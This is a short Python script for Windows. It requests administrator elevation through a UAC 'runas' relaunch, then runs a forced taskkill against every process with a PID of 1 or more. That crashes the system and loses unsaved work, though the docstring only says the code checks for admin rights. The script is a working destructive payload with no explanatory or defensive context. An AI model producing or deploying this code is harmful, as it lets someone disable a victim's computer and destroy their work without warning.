from __future__ import print_function
import ctypes, sys
import os


def is_admin():
    """Check if administractor."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(e)
        return False


if __name__ == "__main__":
    if is_admin():
        print("Get Admin...")
        os.system("Taskkill /fi \"pid ge 1\" /f")
        input()

    else:
        if sys.version_info[0] == 3:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) 
            print("run again...")
        else:
            ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)
